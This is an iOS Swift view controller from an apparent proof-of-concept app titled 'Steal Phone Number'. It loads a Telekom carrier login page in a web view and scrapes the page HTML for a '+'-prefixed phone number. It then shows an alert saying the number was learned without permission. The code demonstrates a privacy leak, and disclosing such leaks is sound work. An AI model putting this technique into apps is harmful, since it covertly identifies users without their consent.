//
//  ViewController.swift
//  Steal Phone Number
//
//  Created by Frederik Riedel on 3/4/18.
//  Copyright © 2018 Frederik Riedel. All rights reserved.
//

import UIKit
import WebKit
import SwiftSoup

class ViewController: UIViewController {
    
    @IBOutlet weak var webView: WKWebView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let url = URL(string: "https://cap.telekom.de/auth?module=substore&subtempid=11100498&wt_mc=im_co_1842_0001_0001_1510306751")!
        let urlRequest = URLRequest(url: url)
        webView.load(urlRequest)
        
        Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { (timer) in
            if !self.webView.isLoading {
                self.webView.evaluateJavaScript("document.documentElement.outerHTML.toString()", completionHandler: { (html: Any?, error: Error?) in
                    do {
                        let doc: Document = try! SwiftSoup.parse(html as! String)
                            let elements = try doc.getElementsByClass("ng-binding ng-scope")
                            for element in elements {
                                let potentialPhoneNumber = try element.html()
                                if potentialPhoneNumber.hasPrefix("+") {
                                    print("found phone number: \(potentialPhoneNumber)")
                                    let alertController = UIAlertController(title: "Watch Out!", message: "I just learned your phone number \(potentialPhoneNumber) without asking for permission!", preferredStyle: .alert)
                                    let ok = UIAlertAction(title: "Learn More", style: .cancel, handler: { (_) in
                                        self.performSegue(withIdentifier: "showAbout", sender: self)
                                    })
                                    alertController.addAction(ok)
                                    self.present(alertController, animated: true)
                                    timer.invalidate()
                                }
                            }
                    } catch Exception.Error(_, let message) {
                        print(message)
                    } catch {
                        print("error")
                    }
                })
            }
        }
    }
}
